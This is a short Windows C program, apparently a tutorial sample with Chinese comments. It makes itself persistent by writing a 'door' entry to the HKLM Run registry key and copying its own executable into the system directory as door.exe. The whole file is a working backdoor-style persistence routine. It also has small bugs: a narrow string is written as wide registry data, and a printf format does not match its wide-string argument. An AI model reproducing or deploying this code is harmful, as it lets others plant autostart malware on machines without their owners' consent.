#pragma warning(disable:4996)
#include <stdio.h>
#include<Windows.h>

int main()
{
	LPCWSTR regname = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";//注册表启动项地址
	HKEY hkResult;//注册表键值句柄
	int ret;
	ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &hkResult);	//打开关键字
	if (ret == 0)
	{
		printf("success to open key\n");
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
	}
	ret = RegSetValueEx(hkResult, L"door", 0, REG_EXPAND_SZ, (unsigned char*)"%systemroot%\\door.exe", 25);//设置键值
	if (ret == 0)
	{
		printf("success to write run key\n");
		RegCloseKey(hkResult);
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
		return 0;
	}
	LPWSTR modlepath=new wchar_t[256];
	LPWSTR syspath=new wchar_t[256];
	GetModuleFileName(0, modlepath, 256);	//取得程序名字
	GetSystemDirectory(syspath, 256);
	ret = CopyFile(modlepath, wcscat(syspath, L"\\door.exe"), 1);
	if (ret)
	{
		printf("%s has been copyed to sys dir %s\n", modlepath, syspath);
	}
	else
		printf("%s is exisis", modlepath);
	system("pause");//只是为了测试给你看清楚，可以删去这一行
	return 0;
}